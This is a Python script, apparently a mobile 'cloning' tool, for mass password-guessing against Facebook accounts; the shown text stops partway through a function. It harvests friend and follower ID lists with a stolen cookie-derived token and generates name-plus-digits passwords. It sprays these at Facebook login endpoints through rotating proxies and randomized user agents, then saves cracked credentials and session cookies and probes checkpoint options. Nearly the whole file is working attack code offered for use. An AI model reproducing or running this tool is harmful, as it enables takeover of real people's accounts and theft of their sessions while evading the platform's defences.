# Modul
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#useragent
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' Error ')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('mr.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/mrbx001/MRBX-5/blob/main/mr.txt').text
		ua=open('.mr.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.mr.txt','r').read().splitlines()
# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
# COLOUR 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m'
p = '\x1b[0;34m' 
asu = random.choice([m,k,h,u,b])
# CONVERTER
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def masud(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
# LOGO
def banner():
	clear()
	masud(f'''\t
██   ██ ███    ██  ██████  ████████ 
 ██ ██  ████   ██ ██    ██    ██    
  ███   ██ ██  ██ ██    ██    ██    
 ██ ██  ██  ██ ██ ██    ██    ██    
██   ██ ██   ████  ██████     ██    
                                    
                                    
\033[0;37m
╔═══════════════════════════════════════╗ \033[0;37m
║[•] Author   : X NOT FOUND X           ║
║[•] Github   : github.com/hamalord4444 ║
║[•] Status   : Premium                 ║
║[•] Network  : 3G,4G/5G ON             ║
║[•] Version  : 1.0.7                   ║
║[•] Tools    : PUBLIC ID CLONING       ║
\033[0;37m╚═══════════════════════════════════════╝ \033[0;37m
''')
# LOGIN
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			ma = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			ma2 = json.loads(ma.text)['name']
			ma3 = json.loads(ma.text)['id']
			menu(ma2,ma3)
		except KeyError:
			login_c()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='purple')
			exit()
	except IOError:
		login_c()
def login_c():
	try:
		os.system('clear')
		banner()
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'%s[%s√%s]%s Enter fresh Cookie : '%(P,H,P,H))
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print('%s[%s✔%s]%s Login successful run again \033[1;97m\033[1;41m python GREEN-FIRE.py \033[0m\033[1;93m'%(N,H,N,H));time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%s✘%s]%s LOGIN Error %s'%(x,k,x,m,x))
		exit()

# MAIN MENU
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('%s[%s✘%s]%s Cookies Expired '%(N,H,N,M))
		time.sleep(5)
		login_c()
	os.system('clear')
	banner()
	print('        \n    [\033[1;97m\033[1;41m  LOGIN INFO   \033[0m\033[1;93m]\n')
	print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m Your ID : "+str(my_id)) 
	print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m Name    : "+str(my_name))
	try:
		gep = requests.get('http://ipinfo.io/json').json()
		print("%s[%s✔%s]%s  Region  :%s %s"%(H,P,H,P,K,gep['region']))
		print("%s[%s✔%s]%s  Ip      :%s %s\n"%(H,P,H,P,K,gep['ip']))
	
	except:
		print("%s[%s✔%s]%s Region :%s -"%(H,P,H,P,K))
		print("%s[%s✔%s]%s Ip :%s -"%(H,P,H,P,K))
	print('\n    [\033[1;97m\033[1;41m  OPTION MENU   \033[0m\033[1;93m]\n')
	print('%s[%s1%s]%s CRACK PUBLIC %s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s[%s2%s]%s CRACK FOLLOWERS %s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s[%s3%s]%s CRACK TAKING FILE %s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s[%sA%s]%s CONTACT %s[%sOwner%s]'%(P,H,P,H,P,H,P))
	print('%s[%sB%s]%s EXIT %s[%sLogOut%s]'%(P,H,P,H,P,H,P))
	MRBX = input('%s[%s?%s]%s select menu %s : '%(N,H,N,H,M))
	if MRBX in ['1','01']:
		public()
	elif MRBX in ['2','02']:
		follower()
	elif MRBX in ['3','03']:
		TakeFile()
	elif MRBX in ['A','a']:
		os.system('xdg-open https://t.me/cracker_team_kurd');menu(my_name,my_id)
	elif MRBX in ['B','b']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('[] Connection Is Over ')
		exit()
# PUBLIC CRACK
def public():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('[?] CRACK ID LIMIT : '))
	except ValueError:
		time.sleep(3)
		print('{k}[✘] NOT PUBLIC ID ')
		follower()
	if jum<1:
		print('[✘] Your limit error')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1		
		kl = input('[➤] INPUT PUBLIC '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
			print('[•] Total Id :{h} '+str(len(id)))
			setting()
		except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)
			public()
		except requests.exceptions.ConnectionError:
			print('{k}[✘] Error Connection ')
			exit()

# FOLLOWER CRACK
def follower():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('[?] CRACK ID LIMIT : '))
	except ValueError:
		print('{k}[✘] NOT PUBLIC ID ')
		time.sleep(3)
		follower()
	if jum<1:
		print('[✘] Your limit error')
		time.sleep(3)
		follower()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1		
		kl = input('[➤] INPUT PUBLIC '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			koh2 = ses.get('https://graph.facebook.com/'+userr+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
			for pi in koh2['subscribers']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
				except:continue
			print('[•] Total Id :{h} '+str(len(id)))
			setting()
		except requests.exceptions.ConnectionError:
			print('[✘] No Connection  ')
			exit()
		except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)
			follower()

def TakeFile():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		
		jum = input('[?] INPUT FILE : ')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print('[•] Total Id :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print('[✘] No Connection  ')
			exit()
	except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)
			follower()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	os.system('clear')
	banner()
	cetak(('\t[bold cyan]          • CRACK METHOD • [/bold cyan]'))
	print('______________________________________________________\n')
	print('[✔][1] CRACK NEW [recommend]')
	print('[✔][2] CRACK OLD [Test]')
	print('[✔][3] CRACK MIX [BEST]')
	print('______________________________________________________\n')
	hu = input('[?] CHOOSE METHODE  : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\n[\033[1;97m\033[1;41m  Choose Method    \033[0m\033[1;93m]\n')
		exit()
	clear()
	banner()
	cetak(('\t[bold cyan]          • METHODE LOGIN • [/bold cyan]'))
	print('______________________________________________________\n')
	print('[✔][1] MOBILE FACEBOOK [GORANNET - FASTLINK - OTHER]')
	print('[✔][2] FREE FACEBOOK [KOREK,ASIA]')
	print('[✔][3] MBASIC FACEBOOK [ALL]')
	
	print(54*"_")
	hc = input('[•] CHOOSE METHODE : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	clear()
	banner()
	print('______________________________________________________\n')
	print('[✔] ADD MANUAL PASSWORD [m/d]')
	
	print(54*"_")
	pwplus=input('[•] CHOOSE METHODE : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print('\n\x1b[1;30m%s[%sXXX%s]%s-----%s[%sXXX%s] '%(H,P,H,P,H,P,H,))
		print(' Use Passward Minimum 6 Digit')
		print('\n\x1b[1;30m%s[%sXXX%s]%s-----%s[%sXXX%s] '%(H,P,H,P,H,P,H,))
		pwku=input('[ MrBx ] Inter Your Passward : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
# Method Main
def passwrd():
	os.system('clear')
	banner()
	os.system('echo -e "========================================================"')
	print("\x1b[1;37m  TOTAL CRACKING ID : "+str(len(id)))
	print("\x1b[1;37m  THE PROCESS HAS STARTED")
	print("\x1b[1;37m  USE FLIGHT (AIRPLANE) MODE BEFORE USE")
	print(" \x1b[1;37m PRESS CTRL + Z TO STOP")
	os.system('echo -e "========================================================"')
	with tred(max_workers=50) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1995')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
					pwv.append(frs+'2004')
					pwv.append(frs+'2005')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1212')
					pwv.append(frs+'1221')
					pwv.append(frs+'123321')
					pwv.append(frs+'12344321')

			else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1995')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
					pwv.append(frs+'2004')
					pwv.append(frs+'2005')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1212')
					pwv.append(frs+'1221')
					pwv.append(frs+'123321')
					pwv.append(frs+'12344321')


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s '%(ok))
	print(' CP : %s '%(cp))
	print('')
	print('[Return Menu ]( Y/t ) ? ')
	woi = input('[MRBX] Inter You Choose  : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t[✔] Good Bye{u} ')
		time.sleep(2)
		exit()
def cek_apk(session,kuki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s{P}[%s®%s] %sSorry there is no Active  Apk%s         '%(N,U,N,B,N))
    else:
        print(f'\r   {P} [{H}®{P}] %s √ Your Active Apps √     :{B}       '%(H))
        for i in range(len(game)):
            print(f"\r    [%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            print(f'\r %s[%s!%s] Sorry, Apk check '%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":koki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,M,N,M,N))
    else:
        print(f'\r   %s [{M}×{P}]{M} Your Expired Apps                 {P}'%(P))
        for i in range(len(game)):
            print(f"    [%s%s]{K} %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
# Mobile 
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{b}[XnotX]{P}[{k}{loop}{P}/{h}{len(id)}{P}]-{P}[{H}OK - {ok}{P}]-{P}[{k}CP - {cp}{x}]-[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'touch.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://touch.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'touch.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://touch.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://touch.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}\n[Xnot-CP]\n[✘] User : {idf}\n[✘] Pass : {pw}{N}')       
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}\n[ Xnot-OK ]\n[✔] Account User :{idf}\n[✔] Account Pass :{pw}\n[✔] Cok :{kuki}\n{ua}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			elif "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}\n[ Xnot-OK ]\n[✔] Account User :{idf}\n[✔] Account Pass :{pw}\n[✔] Cok :{kuki}\n{ua}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[Xnot]{P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}--{ok}-{P}]—{P}[{k}--{cp}-{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': 'NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': 'https://developers.facebook.com/', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1), 'uid': idf, 'flow': 'login_no_pin', 'pass': pw, 'next': 'https://developers.facebook.com/tools/debug/accesstoken/'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('%s[%s•%s]%s═════════════════════════════════%s'%(P,H,P,M))
				print(f'\r{K}\n[ NITAI-CP ]\n[✘] User :{idf}\n[✘] Pass :{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				print('%s[%s•%s]%s═════════════════════════════════%s\n'%(P,H,P,M))
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('%s[%s•%s]%s═════════════════════════════════%s'%(P,H,P,M))
				print(f'\r{H}\n[ NIAI-OK ]\n[✔] User : {idf}\n[✔] Pass :{pw}|{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				print('%s[%s•%s]%s═════════════════════════════════%s\n'%(P,H,P,M))
				ceker(idf,pw)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s[MRBX]%s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s[MRBX]---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s[MRBX]---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s[MRBX]%s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s[MRBX]%s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
